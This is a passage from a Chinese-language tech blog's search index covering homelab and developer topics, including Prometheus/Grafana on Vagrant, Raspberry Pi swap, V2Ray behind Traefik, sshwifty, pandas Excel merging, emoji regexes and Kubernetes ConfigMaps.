docker-ce=${DOCKER_VERSION} sudo usermod -aG docker $USER #Disable swap #https://github.com/kubernetes/kubernetes/issues/53533 sudo swapoff -a \u0026\u0026 sudo sysctl -w vm.swappiness=0 sudo sed '/vagrant--vg-swap/d' -i /etc/fstab git clone --depth=1 https://github.com/Bash-it/bash-it.git ~/.bash_it bash ~/.bash_it/install.sh -s # install docker-compose sudo curl -L \"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose git clone https://github.com/Kev1nChan/docker-prometheus.git cd docker-prometheus sudo /usr/local/bin/docker-compose up -d SHELL # 設定IP config.vm.network :private_network, ip: \"172.17.8.111\" #設定硬體 config.vm.provider :virtualbox do |v| v.customize [\"modifyvm\", :id, \"--cpus\", 2] v.customize [\"modifyvm\", :id, \"--memory\", 4096] v.customize ['modifyvm', :id, '--nicpromisc1', 'allow-all'] end end # 執行 vagrant vagrant up 開瀏覽器 grafana: http://172.17.8.111:3000 帳號/密碼: admin/qwe123!@# prometheus: http://172.17.8.111:9090 node_exporter: http://172.17.8.111:9100 cadvisor: http://172.17.8.111:8080 alertmanager: http://172.17.8.111:9093 這邊就重複上面教的流程 進入設定新增 Prometheus 新增 Prometheus 設定 網址可以設定IP或hostname，這邊跟docker網路連線有關係，所以不解釋太多。 新增 dashboard 大概就這樣 ","date":"2021-04-05","objectID":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/:4:2","tags":["prometheus","exporter"],"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","uri":"/blog/posts/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/"},{"categories":["Linux"],"content":"最近用 prometheus 設定兩台樹莓派 Swap 吃到99%~100% 樹莓派預設都是設定100MB 目前曾經 transmission 有因為記憶體不足關係 有中斷過…，因為記憶體關係 調大 SWAP 參考樹莓派 Raspberry Pi 記憶體不足當機？調整 Swap 交換空間大小解決 - G. T. Wang sudo vim /etc/dphys-swapfile # 100MB設定注解 # 設定 CONF_SWAPFACTOR=2 sudo service dphys-swapfile restart 完成 再觀查這幾個還會不會吃到快滿狀況 ","date":"2021-04-04","objectID":"/blog/posts/Raspberry-Pi-%E8%AA%BF%E6%95%B4-swap-%E8%99%9B%E6%93%AC%E8%A8%98%E6%86%B6%E9%AB%94/:0:0","tags":["linux","swap"],"title":"Raspberry Pi 調整 swap 虛擬記憶體","uri":"/blog/posts/Raspberry-Pi-%E8%AA%BF%E6%95%B4-swap-%E8%99%9B%E6%93%AC%E8%A8%98%E6%86%B6%E9%AB%94/"},{"categories":["實用工具"],"content":"最近寫好 mock api 完後，剛好開發環境也完成了 想直接在本機測試 想說 wiremock 有沒有反向代理方法 結果還真的有耶!! 先前文章有用過 Proxying - WireMock { \"request\": { \"method\": \"ANY\", \"urlPattern\": \"/project/.*\" }, \"response\": { \"proxyBaseUrl\" : \"http://localhost:8080/\" } } Stubbing - WireMock HTTP methods currently supported are: GET, POST, PUT, DELETE, HEAD, TRACE, OPTIONS. You can specify ANY if you want the stub mapping to match on any request method. 未來有空來寫寫看 Rand 非特定字串(如:UUID,TOKEN之類的) ","date":"2021-03-31","objectID":"/blog/posts/wiremock-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%96%B9%E6%B3%95/:0:0","tags":["mockapi","wiremock","java"],"title":"wiremock 反向代理方法","uri":"/blog/posts/wiremock-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Rand http://wiremock.org/docs/response-templating/ ","date":"2021-03-31","objectID":"/blog/posts/wiremock-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%96%B9%E6%B3%95/:1:0","tags":["mockapi","wiremock","java"],"title":"wiremock 反向代理方法","uri":"/blog/posts/wiremock-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"平常維運大量資料，需要分批去撈資料 需要把資料合併又要花很多工 最近在找有什麼好用的方法 ","date":"2021-03-31","objectID":"/blog/posts/%E5%A4%9A%E5%80%8B-Excel-xlsx-%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/:0:0","tags":["pandas","xlsx","excel merge"],"title":"多個 Excel(xlsx) 合併方法","uri":"/blog/posts/%E5%A4%9A%E5%80%8B-Excel-xlsx-%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Excel Merger(付費) https://www.azofreeware.com/2020/06/excel-merger.html 免費版會有 Excel Merger Free 字眼，所以應該沒辦法免費使用… ","date":"2021-03-31","objectID":"/blog/posts/%E5%A4%9A%E5%80%8B-Excel-xlsx-%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/:1:0","tags":["pandas","xlsx","excel merge"],"title":"多個 Excel(xlsx) 合併方法","uri":"/blog/posts/%E5%A4%9A%E5%80%8B-Excel-xlsx-%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"pandas 建議直接安裝Anaconda3 import pandas as pd import numpy as np -- !dir /D *xlsx # window 沒 ls --- import glob glob.glob(\"*xlsx\") --- all_data = pd.DataFrame() for f in glob.glob(\"*xlsx\"): df = pd.read_excel(f) all_data = all_data.append(df,ignore_index=True) --- all_data.to_excel(\"result.xlsx\") 參考: Combining Data From Multiple Excel Files - Practical Business Python ","date":"2021-03-31","objectID":"/blog/posts/%E5%A4%9A%E5%80%8B-Excel-xlsx-%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/:2:0","tags":["pandas","xlsx","excel merge"],"title":"多個 Excel(xlsx) 合併方法","uri":"/blog/posts/%E5%A4%9A%E5%80%8B-Excel-xlsx-%E5%90%88%E4%BD%B5%E6%96%B9%E6%B3%95/"},{"categories":["VPN"],"content":"最近想讓樹莓派做 VPN 後來有找到這個 不同VPN使用方法，這個有點像做代理 後來選這個是因為做 https 可以用 traefik 做更新憑證 這樣我就可以省一步 ","date":"2021-03-28","objectID":"/blog/posts/%E5%9C%A8-Raspberry-Pi-%E5%BB%BA%E7%BD%AE-V2ray/:0:0","tags":["v2ray"],"title":"在 Raspberry Pi 建置 V2ray","uri":"/blog/posts/%E5%9C%A8-Raspberry-Pi-%E5%BB%BA%E7%BD%AE-V2ray/"},{"categories":["VPN"],"content":"前言廢話 GitHub - alphacodinghub/v2ray-nginx-docker: Easy Docker deployment for V2ray + WS +TLS with Nginx, free SSL and Traefik 這邊有實例出來 但我在 build 出錯了… 查看實做一個V2ray 跑 Docker 部署 V2Ray · V2Ray 配置指南|V2Ray 白话文教程 好像沒什麼難度 不如自己試試看 意外這個在 Raspberry PI 也能跑 如果我猜的沒錯，這個掛在 Traefik 應該也能跑 docker run v2fly/v2fly-core ","date":"2021-03-28","objectID":"/blog/posts/%E5%9C%A8-Raspberry-Pi-%E5%BB%BA%E7%BD%AE-V2ray/:1:0","tags":["v2ray"],"title":"在 Raspberry Pi 建置 V2ray","uri":"/blog/posts/%E5%9C%A8-Raspberry-Pi-%E5%BB%BA%E7%BD%AE-V2ray/"},{"categories":["VPN"],"content":"設定實做 參考設定:WebSocket+TLS+Web · V2Ray 配置指南|V2Ray 白话文教程 建立 config.conf { \"inbounds\": [ { \"port\": 10000, \"listen\":\"0.0.0.0\",//這邊原本是127.0.0.1，因為要讓traefik 做反向代理，所以設為0.0.0.0 \"protocol\": \"vmess\", \"settings\": { \"clients\": [ { \"id\": \"b831381d-6324-4e53-ad4f-8cda48b30811\", //建議更換 \"alterId\": 64 } ] }, \"streamSettings\": { \"network\": \"ws\", \"wsSettings\": { \"path\": \"/ray\" } } } ], \"outbounds\": [ { \"protocol\": \"freedom\", \"settings\": {} } ] } # 這邊可以測試看看能不能跑 docker run --rm -v `pwd`/config.json:/etc/v2ray/config.json v2fly/v2fly-core 測試可以跑 我改寫程 docker compose 執行 version: \"2\" services: v2ray_home: image: v2fly/v2fly-core environment: - TZ=Asia/Taipei expose: - \"10000\" restart: always networks: - traefik_network labels: - \"traefik.http.routers.v2ray-https.rule=Host(`pekachu.xxxxxxxx.org`)\" - \"traefik.http.routers.v2ray-https.tls=true\" networks: traefik_network: external: true client 設定 { \"inbounds\": [ { \"port\": 1080, \"listen\": \"127.0.0.1\", \"protocol\": \"socks\", \"sniffing\": { \"enabled\": true, \"destOverride\": [\"http\", \"tls\"] }, \"settings\": { \"auth\": \"noauth\", \"udp\": false } } ], \"outbounds\": [ { \"protocol\": \"vmess\", \"settings\": { \"vnext\": [ { \"address\": \"pekachu.xxxxxxxx.org\", \"port\": 443, \"users\": [ { \"id\": \"b831381d-6324-4e53-ad4f-8cda48b30811\", // 這邊id 需要跟 server 一樣，就等於是密碼 \"alterId\": 64 } ] } ] }, \"streamSettings\": { \"network\": \"ws\", \"security\": \"tls\", \"wsSettings\": { \"path\": \"/ray\" } } } ] } 簡單備註 UUID 可更換用Online UUID Generator Tool網站 address 需要放對印網址(DNS) 要連需要設定代理 sockv5 127.0.0.1 port: 10801(看v2ray client port設多少) 我是使用 v2rayN 相關設定可以看跨越長城 V2Ray Client - 夜升筆談 用瀏覽器執行 ","date":"2021-03-28","objectID":"/blog/posts/%E5%9C%A8-Raspberry-Pi-%E5%BB%BA%E7%BD%AE-V2ray/:2:0","tags":["v2ray"],"title":"在 Raspberry Pi 建置 V2ray","uri":"/blog/posts/%E5%9C%A8-Raspberry-Pi-%E5%BB%BA%E7%BD%AE-V2ray/"},{"categories":["VPN"],"content":"相關文章 Shadowsocks vs V2Ray vs Trojan 都有什么区别？ - LightyearVPN V2Ray 記錄 | Flymia 凡事用心之事 裡面還滿多設定的，可以參考參考 神一样的工具们 · Project V 官方网站 裡面有線上config 產生器 v2ray揭秘：速度最快的v2ray客户端 V2RayN V2RayW Clash Qv2ray Mellow （v2ray翻墙速度测试） - YouTube Client 比較 Clash for Windows配置V2ray教程 - V2ray科技 設個好像有做系統底層代理…不過我沒測試 ","date":"2021-03-28","objectID":"/blog/posts/%E5%9C%A8-Raspberry-Pi-%E5%BB%BA%E7%BD%AE-V2ray/:3:0","tags":["v2ray"],"title":"在 Raspberry Pi 建置 V2ray","uri":"/blog/posts/%E5%9C%A8-Raspberry-Pi-%E5%BB%BA%E7%BD%AE-V2ray/"},{"categories":["Docker"],"content":"最近要build arm image 但是…在Raspberry Pi build 的時間非常久 在想x86有沒有辦法做到 結果真得可以 sudo apt-get update \u0026\u0026 sudo apt-get install -y --no-install-recommends qemu-user-static binfmt-support 參考:【 Solutions 】解決在 x86 環境下無法 Build ARM 的 Docker Image 試著build 一個Raspberry Pi image 沒有什麼問題 ","date":"2021-03-28","objectID":"/blog/posts/x86-%E6%A9%9F%E5%99%A8-build-arm-Docker-Image-%E6%96%B9%E6%B3%95/:0:0","tags":["docker"],"title":"x86 機器 build arm Docker Image 方法","uri":"/blog/posts/x86-%E6%A9%9F%E5%99%A8-build-arm-Docker-Image-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"最近有遠端需求 所以在找類似這個工具 ","date":"2021-03-28","objectID":"/blog/posts/%E5%BB%BA%E7%BD%AE-sshwifty-Web-shell-%E9%80%A3%E7%B7%9A%E5%B7%A5%E5%85%B7/:0:0","tags":["ssh","shell"],"title":"建置 sshwifty (Web shell) 連線工具","uri":"/blog/posts/%E5%BB%BA%E7%BD%AE-sshwifty-Web-shell-%E9%80%A3%E7%B7%9A%E5%B7%A5%E5%85%B7/"},{"categories":["Linux"],"content":"sshwifty 參考網路上範例修改成 traefik version: \"2\" services: sshwifty_home: image: niruix/sshwifty # container_name: sshwifty_home environment: - TZ=Asia/Taipei expose: - \"8182\" restart: always networks: - traefik_network labels: #- \"traefik.http.routers.sshwifty.rule=Host(`sshwifty.xxxxxxxx.org`) || PathPrefix(`/sshwifty`)\" - \"traefik.port=8000\" - \"traefik.protocol=http\" - \"traefik.http.routers.sshwifty-https.rule=Host(`sshwifty.xxxxxxxx.org`)\" - \"traefik.http.routers.sshwifty-https.tls=true\" - \"traefik.http.middlewares.sshwifty-auth.basicauth.users=user:(htppaswd encode password)\" # 記得做密碼調整 #- \"traefik.http.routers.sshwifty.middlewares=sshwifty-auth@docker\" - \"traefik.http.routers.sshwifty-https.middlewares=sshwifty-auth@docker\" networks: traefik_network: external: true 分享一个超实用的 Web 版 SSH 工具 Sshwifty - 奇妙的 Linux 世界 Sshwifty 一款网页端SSH客户端程序 | reizhi ","date":"2021-03-28","objectID":"/blog/posts/%E5%BB%BA%E7%BD%AE-sshwifty-Web-shell-%E9%80%A3%E7%B7%9A%E5%B7%A5%E5%85%B7/:1:0","tags":["ssh","shell"],"title":"建置 sshwifty (Web shell) 連線工具","uri":"/blog/posts/%E5%BB%BA%E7%BD%AE-sshwifty-Web-shell-%E9%80%A3%E7%B7%9A%E5%B7%A5%E5%85%B7/"},{"categories":["Linux"],"content":"其他相關 web ssh 工具 ","date":"2021-03-28","objectID":"/blog/posts/%E5%BB%BA%E7%BD%AE-sshwifty-Web-shell-%E9%80%A3%E7%B7%9A%E5%B7%A5%E5%85%B7/:2:0","tags":["ssh","shell"],"title":"建置 sshwifty (Web shell) 連線工具","uri":"/blog/posts/%E5%BB%BA%E7%BD%AE-sshwifty-Web-shell-%E9%80%A3%E7%B7%9A%E5%B7%A5%E5%85%B7/"},{"categories":["Linux"],"content":"Web SSH 工具整理 GateOne Sshwifty wssh shellinabox web-shell qweb 开源web终端ssh解决方案_程序狗的成长之路-CSDN博客 【webssh】网页上的SSH终端 - K.Takanashi - 博客园 https://gist.github.com/vitoo/8da59382a1565282ed55e78637a6a2f5 ","date":"2021-03-28","objectID":"/blog/posts/%E5%BB%BA%E7%BD%AE-sshwifty-Web-shell-%E9%80%A3%E7%B7%9A%E5%B7%A5%E5%85%B7/:2:1","tags":["ssh","shell"],"title":"建置 sshwifty (Web shell) 連線工具","uri":"/blog/posts/%E5%BB%BA%E7%BD%AE-sshwifty-Web-shell-%E9%80%A3%E7%B7%9A%E5%B7%A5%E5%85%B7/"},{"categories":["Java"],"content":"Keep Learning… public class HelloWorld{ public static void main(String []args){ System.out.println(halfWidth2FullWidth(\"Hello World!!!@\")); System.out.println(fullWidth2halfWidth(\"Ｈｅｌｌｏ　Ｗｏｒｌｄ！！！＠\")); System.out.println(halfWidth2FullWidth(\"Hello World!!!@中文測試\")); System.out.println(fullWidth2halfWidth(\"中文測試Ｈｅｌｌｏ　Ｗｏｒｌｄ！！！＠\")); } /** * Full-angle string conversion half-corner string * 1, half-width characters are starting from 33 to 126 end * 2, the full-width character corresponding to the half-width character is from 65281 start to 65374 end * 3, the half corner of the space is 32. The corresponding Full-width space is 12288 * The relationship between Half-width and Full-width is obvious, except that the character offset is 65248 (65281-33 = 65248). * * @param fullWidthStr Non-empty full-width string * @return Half-angle string */ public static String halfWidth2FullWidth(String fullWidthStr) { if (null == fullWidthStr || fullWidthStr.length() \u003c= 0) { return \"\"; } char[] arr = fullWidthStr.toCharArray(); for (int i = 0; i \u003c arr.length; ++i) { int charValue = (int) arr[i]; if (charValue \u003e= 33 \u0026\u0026 charValue \u003c= 126) { arr[i] = (char) (charValue + 65248); } else if (charValue == 32) { arr[i] = (char) 12288; } } return new String(arr); } private static String fullWidth2halfWidth(String fullWidthStr) { if (null == fullWidthStr || fullWidthStr.length() \u003c= 0) { return \"\"; } char[] charArray = fullWidthStr.toCharArray(); //對全形字元轉換的char陣列遍歷 for (int i = 0; i \u003c charArray.length; i++) { int charIntValue = (int) charArray[i]; //如果符合轉換關係,將對應下標之間減掉偏移量65248;如果是空格的話,直接做轉換 if (charIntValue \u003e= 65281 \u0026\u0026 charIntValue \u003c= 65374) { charArray[i] = (char) (charIntValue - 65248); } else if (charIntValue == 12288) { charArray[i] = (char) 32; } } return new String(charArray); } } javascript-半形字串轉全形 @ 程式設計 - 網頁 :: 隨意窩 Xuite日誌 java - How to know half-width or full-width character? - Stack Overflow encoding - How to convert from full-width to half-width Japanese characters in Java? - Stack Overflow ","date":"2021-03-08","objectID":"/blog/posts/%E7%A8%8B%E5%BC%8F%E5%8D%8A%E5%9E%8B%E8%BD%89%E5%85%A8%E5%9E%8B%E6%96%B9%E6%B3%95/:0:0","tags":null,"title":"程式半型轉全型方法","uri":"/blog/posts/%E7%A8%8B%E5%BC%8F%E5%8D%8A%E5%9E%8B%E8%BD%89%E5%85%A8%E5%9E%8B%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"最進工作維運上要抓 Emoji 文字 常常用肉眼去找 表情符號 後來發現 TW,JP 也有 Emoji 肉眼不一定抓的到 所以看一下有沒有 Regex 真的可以用…後來發現不是每一個 Editor 都可以用 在這邊整理一下 編輯器抓取 Emoji ","date":"2021-03-08","objectID":"/blog/posts/%E7%B7%A8%E8%BC%AF%E5%99%A8%E6%8A%93%E5%8F%96-Emoji/:0:0","tags":["sublime","vscode","notepad++"],"title":"編輯器抓取 Emoji 文字方法","uri":"/blog/posts/%E7%B7%A8%E8%BC%AF%E5%99%A8%E6%8A%93%E5%8F%96-Emoji/"},{"categories":["Linux"],"content":"Sublime Text [\\x{1f300}-\\x{1f5ff}\\x{1f900}-\\x{1f9ff}\\x{1f600}-\\x{1f64f}\\x{1f680}-\\x{1f6ff}\\x{2600}-\\x{26ff}\\x{2700}-\\x{27bf}\\x{1f1e6}-\\x{1f1ff}\\x{1f191}-\\x{1f251}\\x{1f004}\\x{1f0cf}\\x{1f170}-\\x{1f171}\\x{1f17e}-\\x{1f17f}\\x{1f18e}\\x{3030}\\x{2b50}\\x{2b55}\\x{2934}-\\x{2935}\\x{2b05}-\\x{2b07}\\x{2b1b}-\\x{2b1c}\\x{3297}\\x{3299}\\x{303d}\\x{00a9}\\x{00ae}\\x{2122}\\x{23f3}\\x{24c2}\\x{23e9}-\\x{23ef}\\x{25b6}\\x{23f8}-\\x{23fa}] unicode - grep for emojis in linux - Stack Overflow ","date":"2021-03-08","objectID":"/blog/posts/%E7%B7%A8%E8%BC%AF%E5%99%A8%E6%8A%93%E5%8F%96-Emoji/:0:1","tags":["sublime","vscode","notepad++"],"title":"編輯器抓取 Emoji 文字方法","uri":"/blog/posts/%E7%B7%A8%E8%BC%AF%E5%99%A8%E6%8A%93%E5%8F%96-Emoji/"},{"categories":["Linux"],"content":"Visual Studio Code [\\u{1f300}-\\u{1f5ff}\\u{1f900}-\\u{1f9ff}\\u{1f600}-\\u{1f64f}\\u{1f680}-\\u{1f6ff}\\u{2600}-\\u{26ff}\\u{2700}-\\u{27bf}\\u{1f1e6}-\\u{1f1ff}\\u{1f191}-\\u{1f251}\\u{1f004}\\u{1f0cf}\\u{1f170}-\\u{1f171}\\u{1f17e}-\\u{1f17f}\\u{1f18e}\\u{3030}\\u{2b50}\\u{2b55}\\u{2934}-\\u{2935}\\u{2b05}-\\u{2b07}\\u{2b1b}-\\u{2b1c}\\u{3297}\\u{3299}\\u{303d}\\u{00a9}\\u{00ae}\\u{2122}\\u{23f3}\\u{24c2}\\u{23e9}-\\u{23ef}\\u{25b6}\\u{23f8}-\\u{23fa}\\u{200d}] ","date":"2021-03-08","objectID":"/blog/posts/%E7%B7%A8%E8%BC%AF%E5%99%A8%E6%8A%93%E5%8F%96-Emoji/:0:2","tags":["sublime","vscode","notepad++"],"title":"編輯器抓取 Emoji 文字方法","uri":"/blog/posts/%E7%B7%A8%E8%BC%AF%E5%99%A8%E6%8A%93%E5%8F%96-Emoji/"},{"categories":["Linux"],"content":"Notepad++ 沒有找到方法 以下是用 workaround 方法 處理這個不建議用這個… [©️®️‼️⁉️™️ℹ️↔️↕️↖️↗️↘️↙️↩️↪️⌚️⌛️⌨️⏏️⏩️⏪️⏫️⏬️⏭️⏮️⏯️⏰️⏱️⏲️⏳️⏸️⏹️⏺️Ⓜ️▪️▫️▶️◀️◻️◼️◽️◾️☀️☁️☂️☃️☄️☎️☑️☔️☕️☘️☝️☠️☢️☣️☦️☪️☮️☯️☸️☹️☺️♀️♂️♈️♉️♊️♋️♌️♍️♎️♏️♐️♑️♒️♓️♠️♣️♥️♦️♨️♻️♿️⚒️⚓️⚔️⚕️⚖️⚗️⚙️⚛️⚜️⚠️⚡️⚪️⚫️⚰️⚱️⚽️⚾️⛄️⛅️⛈️⛎️⛏️⛑️⛓️⛔️⛩️⛪️⛰️⛱️⛲️⛳️⛴️⛵️⛷️⛸️⛹️⛺️⛽️✂️✅️✈️✉️✊️✋️✌️✍️✏️✒️✔️✖️✝️✡️✨️✳️✴️❄️❇️❌️❎️❓️❔️❕️❗️❣️❤️➕️➖️➗️➡️➰️➿️⤴️⤵️⬅️⬆️⬇️⬛️⬜️⭐️⭕️〰️〽️㊗️㊙️🀄🃏🅰️🅱️🅾️🅿️🆎🆑🆒🆓🆔🆕🆖🆗🆘🆙🆚🈁🈂️🈚🈯🈲🈳🈴🈵🈶🈷️🈸🈹🈺🉐🉑🌀🌁🌂🌃🌄🌅🌆🌇🌈🌉🌊🌋🌌🌍🌎🌏🌐🌑🌒🌓🌔🌕🌖🌗🌘🌙🌚🌛🌜🌝🌞🌟🌠🌡️🌤️🌥️🌦️🌧️🌨️🌩️🌪️🌫️🌬️🌭🌮🌯🌰🌱🌲🌳🌴🌵🌶️🌷🌸🌹🌺🌻🌼🌽🌾🌿🍀🍁🍂🍃🍄🍅🍆🍇🍈🍉🍊🍋🍌🍍🍎🍏🍐🍑🍒🍓🍔🍕🍖🍗🍘🍙🍚🍛🍜🍝🍞🍟🍠🍡🍢🍣🍤🍥🍦🍧🍨🍩🍪🍫🍬🍭🍮🍯🍰🍱🍲🍳🍴🍵🍶🍷🍸🍹🍺🍻🍼🍽️🍾🍿🎀🎁🎂🎃🎄🎅🎆🎇🎈🎉🎊🎋🎌🎍🎎🎏🎐🎑🎒🎓🎖️🎗️🎙️🎚️🎛️🎞️🎟️🎠🎡🎢🎣🎤🎥🎦🎧🎨🎩🎪🎫🎬🎭🎮🎯🎰🎱🎲🎳🎴🎵🎶🎷🎸🎹🎺🎻🎼🎽🎾🎿🏀🏁🏂🏃🏄🏅🏆🏇🏈🏉🏊🏋️🏌️🏍️🏎️🏏🏐🏑🏒🏓🏔️🏕️🏖️🏗️🏘️🏙️🏚️🏛️🏜️🏝️🏞️🏟️🏠🏡🏢🏣🏤🏥🏦🏧🏨🏩🏪🏫🏬🏭🏮🏯🏰🏳️🏴🏵️🏷️🏸🏹🏺🏻🏼🏽🏾🏿🐀🐁🐂🐃🐄🐅🐆🐇🐈🐉🐊🐋🐌🐍🐎🐏🐐🐑🐒🐓🐔🐕🐖🐗🐘🐙🐚🐛🐜🐝🐞🐟🐠🐡🐢🐣🐤🐥🐦🐧🐨🐩🐪🐫🐬🐭🐮🐯🐰🐱🐲🐳🐴🐵🐶🐷🐸🐹🐺🐻🐼🐽🐾🐿️👀👁️👂👃👄👅👆👇👈👉👊👋👌👍👎👏👐👑👒👓👔👕👖👗👘👙👚👛👜👝👞👟👠👡👢👣👤👥👦👧👨👩👪👫👬👭👮👯👰👱👲👳👴👵👶👷👸👹👺👻👼👽👾👿💀💁💂💃💄💅💆💇💈💉💊💋💌💍💎💏💐💑💒💓💔💕💖💗💘💙💚💛💜💝💞💟💠💡💢💣💤💥💦💧💨💩💪💫💬💭💮💯💰💱💲💳💴💵💶💷💸💹💺💻💼💽💾💿📀📁📂📃📄📅📆📇📈📉📊📋📌📍📎📏📐📑📒📓📔📕📖📗📘📙📚📛📜📝📞📟📠📡📢📣📤📥📦📧📨📩📪📫📬📭📮📯📰📱📲📳📴📵📶📷📸📹📺📻📼📽️📿🔀🔁🔂🔃🔄🔅🔆🔇🔈🔉🔊🔋🔌🔍🔎🔏🔐🔑🔒🔓🔔🔕🔖🔗🔘🔙🔚🔛🔜🔝🔞🔟🔠🔡🔢🔣🔤🔥🔦🔧🔨🔩🔪🔫🔬🔭🔮🔯🔰🔱🔲🔳🔴🔵🔶🔷🔸🔹🔺🔻🔼🔽🕉️🕊️🕋🕌🕍🕎🕐🕑🕒🕓🕔🕕🕖🕗🕘🕙🕚🕛🕜🕝🕞🕟🕠🕡🕢🕣🕤🕥🕦🕧🕯️🕰️🕳️🕴️🕵️🕶️🕷️🕸️🕹️🕺🖇️🖊️🖋️🖌️🖍️🖐️🖕🖖🖤🖥️🖨️🖱️🖲️🖼️🗂️🗃️🗄️🗑️🗒️🗓️🗜️🗝️🗞️🗡️🗣️🗨️🗯️🗳️🗺️🗻🗼🗽🗾🗿😀😁😂😃😄😅😆😇😈😉😊😋😌😍😎😏😐😑😒😓😔😕😖😗😘😙😚😛😜😝😞😟😠😡😢😣😤😥😦😧😨😩😪😫😬😭😮😯😰😱😲😳😴😵😶😷😸😹😺😻😼😽😾😿🙀🙁🙂🙃🙄🙅🙆🙇🙈🙉🙊🙋🙌🙍🙎🙏🚀🚁🚂🚃🚄🚅🚆🚇🚈🚉🚊🚋🚌🚍🚎🚏🚐🚑🚒🚓🚔🚕🚖🚗🚘🚙🚚🚛🚜🚝🚞🚟🚠🚡🚢🚣🚤🚥🚦🚧🚨🚩🚪🚫🚬🚭🚮🚯🚰🚱🚲🚳🚴🚵🚶🚷🚸🚹🚺🚻🚼🚽🚾🚿🛀🛁🛂🛃🛄🛅🛋️🛌🛍️🛎️🛏️🛐🛑🛒🛠️🛡️🛢️🛣️🛤️🛥️🛩️🛫🛬🛰️🛳️🛴🛵🛶🛷🛸🤐🤑🤒🤓🤔🤕🤖🤗🤘🤙🤚🤛🤜🤝🤞🤟🤠🤡🤢🤣🤤🤥🤦🤧🤨🤩🤪🤫🤬🤭🤮🤯🤰🤱🤲🤳🤴🤵🤶🤷🤸🤹🤺🤼🤽🤾🥀🥁🥂🥃🥄🥅🥇🥈🥉🥊🥋🥌🥐🥑🥒🥓🥔🥕🥖🥗🥘🥙🥚🥛🥜🥝🥞🥟🥠🥡🥢🥣🥤🥥🥦🥧🥨🥩🥪🥫🦀🦁🦂🦃🦄🦅🦆🦇🦈🦉🦊🦋🦌🦍🦎🦏🦐🦑🦒🦓🦔🦕🦖🦗🧀🧐🧑🧒🧓🧔🧕🧖🧗🧘🧙🧚🧛🧜🧝🧞🧟🧠🧡🧢🧣🧤🧥🧦] 也不能用… 後來發現是 字串 1232 長度 就可以 超過就不能查詢 ","date":"2021-03-08","objectID":"/blog/posts/%E7%B7%A8%E8%BC%AF%E5%99%A8%E6%8A%93%E5%8F%96-Emoji/:0:3","tags":["sublime","vscode","notepad++"],"title":"編輯器抓取 Emoji 文字方法","uri":"/blog/posts/%E7%B7%A8%E8%BC%AF%E5%99%A8%E6%8A%93%E5%8F%96-Emoji/"},{"categories":["Kuberenetes"],"content":"Kubernetes 的 ConfigMap 常常會跟 Storage 有關係。 可以針對 volume(檔案設定檔) environment variable (環境變數) ","date":"2021-03-03","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/:0:0","tags":["configmap"],"title":"Kubernetes 的 ConfigMap","uri":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/"},{"categories":["Kuberenetes"],"content":"設定關鍵字 掛載檔案方式: 使用 Volume 掛在 Pod 使用 VolumeMount 掛在 Container 套用環境變數上: 使用 configMapKeyRef 掛在 環境變數 ","date":"2021-03-03","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/:1:0","tags":["configmap"],"title":"Kubernetes 的 ConfigMap","uri":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/"},{"categories":["Kuberenetes"],"content":"建立 Clusters kubectl create configmap \u003cmap-name\u003e \u003cdata-source\u003e # Create the local directory mkdir -p configure-pod-container/configmap/ # Download the sample files into `configure-pod-container/configmap/` directory wget https://kubernetes.io/examples/configmap/game.properties -O configure-pod-container/configmap/game.properties wget https://kubernetes.io/examples/configmap/ui.properties -O configure-pod-container/configmap/ui.properties # Create the configmap kubectl create configmap game-config --from-file=configure-pod-container/configmap/ 這邊有點有趣，client 端做，nodes 竟然可以吃到抓下來的 properties 不知道底層原理怎麼做到 kubectl get configmaps game-config -o yaml apiVersion: v1 kind: ConfigMap metadata: creationTimestamp: 2016-02-18T18:52:05Z name: game-config namespace: default resourceVersion: \"516\" uid: b4952dc3-d670-11e5-8cd0-68f728db1985 data: game.properties: | enemies=aliens lives=3 enemies.cheat=true enemies.cheat.level=noGoodRotten secret.code.passphrase=UUDDLRLRBABAS secret.code.allowed=true secret.code.lives=30 ui.properties: | color.good=purple color.bad=yellow allow.textmode=true how.nice.to.look=fairlyNice ","date":"2021-03-03","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/:2:0","tags":["configmap"],"title":"Kubernetes 的 ConfigMap","uri":"/blog/posts/Kubernetes-%E7%9A%84-ConfigMap/"},{"categories":["Kuberenetes"],"content":"從檔案建立 ConfigMap kubectl create configmap game-config-2 --from-file=configure-pod-container/configmap/game.properties kubectl describe configmaps game-config-2 Name: game-config-2 Namespace: default Labels: \u003cnone\u003e Annotations: \u003cnone\u003e Data ==== game.properties: ---- enemies=aliens lives=3 enemies.cheat=true enemies.cheat.level=noGoodRotten secret.code.passphrase=UUDDLRLRBABAS secret.code.allowed=true secret.code.lives=30 Events: \u003cnone\u003e # 同時使用--from-file 載入多個檔案 kubectl create configmap game-config-2 